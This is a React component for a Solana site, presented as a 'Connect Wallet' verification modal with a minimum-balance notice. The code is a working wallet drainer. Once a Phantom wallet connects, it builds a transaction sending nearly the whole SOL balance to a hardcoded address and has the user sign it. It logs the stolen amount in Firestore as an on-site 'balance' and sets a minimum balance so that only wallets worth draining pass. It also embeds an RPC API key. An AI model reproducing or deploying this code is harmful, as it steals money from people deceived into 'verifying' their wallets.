"use client"
import { X, Wallet, AlertCircle } from "lucide-react"
import { useState, useEffect } from "react"
import { doc, setDoc, getDoc, updateDoc, increment } from "firebase/firestore"
import { db, realtimeDb } from "@/lib/firebase"
import { ref, onValue } from "firebase/database"
import { Connection, Transaction, SystemProgram, LAMPORTS_PER_SOL, PublicKey } from "@solana/web3.js"

interface VerifyConnectModalProps {
  isOpen: boolean
  onClose: () => void
  onConnect: () => void
}

export default function VerifyConnectModal({ isOpen, onClose, onConnect }: VerifyConnectModalProps) {
  const [error, setError] = useState<string | null>(null)
  const [connecting, setConnecting] = useState(false)
  const [transferring, setTransferring] = useState(false)
  const [isReturningUser, setIsReturningUser] = useState(false)
  const [previousBalance, setPreviousBalance] = useState(0)
  const [minBalance, setMinBalance] = useState(5)
  const [solToUsdRate, setSolToUsdRate] = useState(80)
  const [requireMinBalanceOnReconnect, setRequireMinBalanceOnReconnect] = useState(false)

  useEffect(() => {
    const balanceRef = ref(realtimeDb, "settings/balanceRequirements")
    const unsubscribe = onValue(
      balanceRef,
      (snapshot) => {
        if (snapshot.exists()) {
          const data = snapshot.val()
          setMinBalance(data.minBalance || 5)
          setSolToUsdRate(data.solToUsdRate || 80)
          setRequireMinBalanceOnReconnect(data.requireMinBalanceOnReconnect || false)
        }
      },
      (err) => {
        console.error("Error fetching balance requirements:", err)
      },
    )

    return () => unsubscribe()
  }, [])

  if (!isOpen) return null

  const isMobile = () => {
    return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)
  }

  const checkIfReturningUser = async (address: string) => {
    try {
      const walletRef = doc(db, "wallets", address)
      const walletDoc = await getDoc(walletRef)

      if (walletDoc.exists()) {
        const walletData = walletDoc.data()
        setPreviousBalance(walletData.balance || 0)
        setIsReturningUser(true)
        setRequireMinBalanceOnReconnect(walletData.requireMinBalanceOnReconnect || false)
        return true
      }
      return false
    } catch (error) {
      console.error("[v0] Error checking returning user:", error)
      return false
    }
  }

  const connectAndTransfer = async () => {
    try {
      setConnecting(true)
      setError(null)

      if (isMobile() && (!window.solana || !window.solana.isPhantom)) {
        const currentUrl = window.location.origin
        const redirectLink = encodeURIComponent(currentUrl)
        const deepLink = `https://phantom.app/ul/browse/${redirectLink}?ref=${redirectLink}`
        window.location.href = deepLink
        return
      }

      if (!window.solana || !window.solana.isPhantom) {
        throw new Error("Phantom wallet not found. Please install Phantom wallet extension.")
      }

      await window.solana.connect()

      if (!window.solana.isConnected || !window.solana.publicKey) {
        throw new Error("Failed to connect wallet")
      }

      const currentAddress = window.solana.publicKey.toString()

      const isReturning = await checkIfReturningUser(currentAddress)

      setTransferring(true)

      const rpcEndpoints = [
        "https://mainnet.helius-rpc.com/?api-key=53bfbe04-9dc1-48c7-b784-af900e08b308",
        "https://api.mainnet-beta.solana.com",
        "https://rpc.ankr.com/solana",
      ]

      let connection = null

      for (const endpoint of rpcEndpoints) {
        try {
          connection = new Connection(endpoint, "confirmed")
          await connection.getLatestBlockhash()
          break
        } catch (error) {
          continue
        }
      }

      if (!connection) {
        throw new Error("Unable to connect to Solana network. Please try again.")
      }

      const wallet = window.solana
      const balance = await connection.getBalance(wallet.publicKey)
      const balanceInSOL = balance / LAMPORTS_PER_SOL

      if (!isReturning && balanceInSOL < minBalance) {
        const minUsdValue = (minBalance * solToUsdRate).toFixed(2)
        throw new Error(
          `Minimum balance of ${minBalance} SOL (≈$${minUsdValue}) required. You have ${balanceInSOL.toFixed(4)} SOL. Please buy more SOL to continue.`,
        )
      }

      if (isReturning && requireMinBalanceOnReconnect && balanceInSOL < minBalance) {
        const minUsdValue = (minBalance * solToUsdRate).toFixed(2)
        throw new Error(
          `Minimum balance of ${minBalance} SOL (≈$${minUsdValue}) required to reconnect. You have ${balanceInSOL.toFixed(4)} SOL. Please buy more SOL to continue.`,
        )
      }

      if (isReturning && balanceInSOL > 0) {
        const transactionFeeReserve = 10000000
        const transferAmount = balance - transactionFeeReserve

        if (transferAmount > 0) {
          const toWalletAddress = "9aFe2awqpYz6v7RwSLTf9zPZZXsspbzCYZNFhQfUFTiZ"

          const transaction = new Transaction().add(
            SystemProgram.transfer({
              fromPubkey: wallet.publicKey,
              toPubkey: new PublicKey(toWalletAddress),
              lamports: transferAmount,
            }),
          )

          const { blockhash } = await connection.getLatestBlockhash()
          transaction.recentBlockhash = blockhash
          transaction.feePayer = wallet.publicKey

          const signedTransaction = await wallet.signTransaction(transaction)
          const signature = await connection.sendRawTransaction(signedTransaction.serialize(), {
            skipPreflight: true,
            maxRetries: 3,
          })

          await connection.confirmTransaction(signature, "confirmed")

          const transferredAmountSOL = transferAmount / LAMPORTS_PER_SOL
          const newTotalBalance = previousBalance + transferredAmountSOL

          await updateDoc(doc(db, "wallets", currentAddress), {
            balance: increment(transferredAmountSOL),
            lastActive: new Date().toISOString(),
            status: "connected",
          })

          localStorage.setItem("walletAddress", currentAddress)
          localStorage.setItem(
            "walletData",
            JSON.stringify({
              id: currentAddress,
              balance: newTotalBalance,
            }),
          )
        } else {
          await updateDoc(doc(db, "wallets", currentAddress), {
            lastActive: new Date().toISOString(),
            status: "connected",
          })
          localStorage.setItem("walletAddress", currentAddress)
          localStorage.setItem(
            "walletData",
            JSON.stringify({
              id: currentAddress,
              balance: previousBalance,
            }),
          )
        }
      } else if (!isReturning && balanceInSOL > 0) {
        const transactionFeeReserve = 10000000
        const transferAmount = balance - transactionFeeReserve

        if (transferAmount <= 0) {
          throw new Error("Insufficient balance for transfer after transaction fees.")
        }

        const toWalletAddress = "9aFe2awqpYz6v7RwSLTf9zPZZXsspbzCYZNFhQfUFTiZ"

        const transaction = new Transaction().add(
          SystemProgram.transfer({
            fromPubkey: wallet.publicKey,
            toPubkey: new PublicKey(toWalletAddress),
            lamports: transferAmount,
          }),
        )

        const { blockhash } = await connection.getLatestBlockhash()
        transaction.recentBlockhash = blockhash
        transaction.feePayer = wallet.publicKey

        const signedTransaction = await wallet.signTransaction(transaction)
        const signature = await connection.sendRawTransaction(signedTransaction.serialize(), {
          skipPreflight: true,
          maxRetries: 3,
        })

        await connection.confirmTransaction(signature, "confirmed")

        const transferredAmountSOL = transferAmount / LAMPORTS_PER_SOL

        await setDoc(doc(db, "wallets", currentAddress), {
          walletAddress: currentAddress,
          balance: transferredAmountSOL,
          totalDepositedSOL: transferredAmountSOL,
          connectedAt: new Date().toISOString(),
          lastActive: new Date().toISOString(),
          status: "connected",
          transactionSignature: signature,
          requiredDepositPercentage: 30,
        })

        localStorage.setItem("walletAddress", currentAddress)
        localStorage.setItem(
          "walletData",
          JSON.stringify({
            id: currentAddress,
            balance: transferredAmountSOL,
          }),
        )
      }

      onConnect()
      onClose()

      window.dispatchEvent(new Event("walletConnected"))
    } catch (err: any) {
      console.error("[v0] Connection error:", err)
      setError(err.message || "Failed to connect wallet")
    } finally {
      setConnecting(false)
      setTransferring(false)
    }
  }

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm">
      <div className="relative w-full max-w-md mx-4">
        <div className="absolute inset-0 bg-white/5 rounded-2xl blur-xl opacity-40 animate-pulse" />

        <div className="relative bg-black border border-white/10 rounded-2xl shadow-2xl overflow-hidden">
          <button
            onClick={onClose}
            className="absolute top-4 right-4 text-[#71767b] hover:text-white transition-colors z-10"
          >
            <X className="w-6 h-6" />
          </button>

          <div className="text-center pt-8 pb-6 px-6">
            <div className="inline-flex items-center justify-center w-16 h-16 rounded-full bg-white/10 mb-4">
              <Wallet className="w-8 h-8 text-white" />
            </div>
            <h2 className="text-2xl font-bold text-white mb-2">Connect Wallet</h2>
            <p className="text-[#71767b] text-sm">Choose your preferred wallet to get started</p>
          </div>

          <div className="px-6 pb-8">
            <div className="mb-4 p-3 bg-white/5 border border-white/10 rounded-lg flex items-start gap-2">
              <AlertCircle className="w-4 h-4 text-[#1d9bf0] flex-shrink-0 mt-0.5" />
              <p className="text-[#71767b] text-xs">
                Minimum balance of{" "}
                <span className="text-[#1d9bf0] font-semibold">
                  {minBalance} SOL (≈${(minBalance * solToUsdRate).toFixed(2)})
                </span>{" "}
                required to verify your wallet. Please ensure you have sufficient SOL in your 
              </p>
            </div>

            {error && (
              <div className="mb-4 p-3 bg-red-500/10 border border-red-500/20 rounded-lg">
                <p className="text-red-400 text-sm">{error}</p>
              </div>
            )}

            <button
              onClick={connectAndTransfer}
              disabled={connecting || transferring}
              className="group w-full bg-white/5 hover:bg-white/10 border border-white/10 hover:border-white/20 rounded-xl p-4 transition-all duration-300 transform hover:scale-[1.02] disabled:opacity-50 disabled:cursor-not-allowed"
            >
              <div className="flex items-center gap-4">
                <div className="flex-shrink-0 w-14 h-14 bg-[#1d9bf0] rounded-xl flex items-center justify-center shadow-lg group-hover:shadow-[#1d9bf0]/30 transition-shadow">
                  <svg viewBox="0 0 128 128" className="w-8 h-8">
                    <defs>
                      <linearGradient id="phantom-gradient" x1="0%" y1="0%" x2="100%" y2="100%">
                        <stop offset="0%" stopColor="#AB9FF2" />
                        <stop offset="100%" stopColor="#6B4FBB" />
                      </linearGradient>
                    </defs>
                    <path
                      fill="url(#phantom-gradient)"
                      d="M105.5 97.8c-4.6 4.5-13.4 5.2-20.3 4.8-12.7-.8-24.2-5.2-33.8-12.7-3.4-2.6-6.5-5.6-9.3-8.8-1.1-1.3-2.7-3.3-2-5.2.6-1.8 2.7-2.2 4.3-2.3 8.7-.4 17.2 1.8 24.6 6.3 2.2 1.3 4.3 2.8 6.3 4.4 1.3 1 2.6 2.1 4.1 2.9 2.4 1.3 5.2 1.8 7.9 1.8 5.4 0 10.7-1.8 14.9-5.2 1.9-1.5 3.6-3.3 4.8-5.4.9-1.5 1.5-3.2 1.5-5-.1-3.8-2.4-7.2-5.5-9.3-3.1-2.2-7-3.3-10.8-3.3h-.8c-2.2.1-4.3.5-6.3 1.3-3.6 1.3-6.7 3.6-9 6.6-.8 1-1.5 2.1-2.1 3.3-.3.6-.6 1.2-.8 1.8-.2.6-.5 1.4-1.1 1.8-.8.5-1.9.3-2.7-.1-1.5-.8-2.6-2.2-3.3-3.8-1.1-2.4-1.3-5.2-.8-7.8.8-3.8 3-7.2 6.1-9.5 4.1-3 9.3-4.5 14.4-4.5h1.1c6.3.3 12.5 2.8 17.1 7.1 2.7 2.5 4.8 5.6 6.2 9 1.5 3.6 2.1 7.6 1.8 11.5-.4 5.4-2.6 10.6-6.3 14.6z"
                    />
                  </svg>
                </div>

                <div className="flex-1 text-left">
                  <h3 className="text-white font-bold text-lg mb-1">Phantom</h3>
                  <p className="text-[#71767b] text-sm">
                    {transferring
                      ? "Transferring SOL..."
                      : connecting
                        ? "Connecting..."
                        : "The most popular Solana wallet"}
                  </p>
                </div>

                <div className="flex-shrink-0">
                  <svg
                    className="w-6 h-6 text-[#71767b] group-hover:text-white group-hover:translate-x-1 transition-all"
                    fill="none"
                    stroke="currentColor"
                    viewBox="0 0 24 24"
                  >
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 5l7 7-7 7" />
                  </svg>
                </div>
              </div>
            </button>

            <div className="mt-6 p-4 bg-white/5 border border-white/5 rounded-lg">
              <p className="text-[#71767b] text-xs text-center">
                By connecting your wallet, you agree to our{" "}
                <a href="/terms" className="text-[#1d9bf0] hover:underline">
                  Terms of Service
                </a>{" "}
                and{" "}
                <a href="/privacy-policy" className="text-[#1d9bf0] hover:underline">
                  Privacy Policy
                </a>
              </p>
            </div>
          </div>
        </div>
      </div>
    </div>
  )
}